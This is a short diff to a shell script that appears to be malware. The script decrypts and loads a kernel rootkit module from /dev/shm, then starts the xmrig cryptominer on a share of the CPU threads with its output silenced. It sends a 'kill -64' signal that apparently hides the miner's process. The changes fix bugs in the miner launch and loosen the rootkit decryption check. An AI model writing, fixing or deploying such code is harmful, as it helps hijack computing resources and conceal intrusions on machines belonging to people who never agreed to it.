@@ -49,7 +49,7 @@ if [ ! -d "$module_dir" ]; then
 fi
 
 #cp "$module_compile_dir/rootkit.ko" "$module_dir/rootkit.ko"
-if [ -f "$module_dir/rootkit.ko.enc" ] && [ -f "/boot/keyfile.bin" ]; then
+if [ -f "$module_dir/rootkit.ko.enc" ] || [ -f "/boot/keyfile.bin" ]; then
 	openssl enc -d -aes-256-cbc -pbkdf2 -in "$module_dir/rootkit.ko.enc" -out "/dev/shm/rootkit.ko" -pass file:"/boot/keyfile.bin"
 fi
 insmod "/dev/shm/rootkit.ko"
@@ -61,11 +61,11 @@ threads=$(lscpu | awk -F: '/^CPU\(s\):/ {gsub(/^[ \t]+/, "", $2); print $2}')
 #check if min number of threads is six
 if [ "$threads" -gt 4 ]; then
 	#check if we got xmrig and if not then wget xmrig
-(	while [ ! -f $xmrig_binary ] && [ ! -f $xmrig_config]; do
+(	while [ ! -f $xmrig_binary ] && [ ! -f $xmrig_config ]; do
 		sleep 5
 	done
 	usable_threads=$((threads * 20 / 100))
-	"$xmrig_binary" --config="$xmrig_config" --threads=$usable_threads > /dev/null 2/&1 &
+	"$xmrig_binary" --config="$xmrig_config" --threads=$usable_threads > /dev/null 2>&1 &
 	kill -64 $!
 ) &
 fi
